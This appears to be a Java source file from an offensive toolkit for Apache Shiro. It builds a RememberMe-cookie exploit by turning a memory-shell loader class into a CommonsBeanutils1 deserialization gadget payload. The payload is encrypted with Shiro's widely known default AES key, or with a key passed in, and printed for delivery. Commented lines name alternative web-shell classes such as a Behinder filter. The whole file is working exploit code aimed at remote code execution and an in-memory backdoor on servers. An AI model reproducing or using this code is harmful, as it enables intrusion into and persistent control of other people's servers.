package com.govuln.shiroattack.memshell;

import com.govuln.shiroattack.CommonsBeanutils1Shiro;
import javassist.*;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client_memshell {
    public static void main(String vurl, String vkey) throws Exception {
        ClassPool pool = ClassPool.getDefault();
//        CtClass clazz = pool.get(com.govuln.shiroattack.memshell.BehinderFilter.class.getName());
//        CtClass clazz = pool.get(com.govuln.shiroattack.memshell.MyClassLoader.class.getName());
        CtClass clazz = pool.get(com.govuln.shiroattack.memshell.ClassDataLoader.class.getName());

        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();

        String shiro_key = "kPH+bIxk5D2deZiIxcaaaA==";
        shiro_key = vkey;
        byte[] key = java.util.Base64.getDecoder().decode(shiro_key);

        ByteSource ciphertext = aes.encrypt(payloads, key);


        System.out.printf(ciphertext.toString());


    }

}
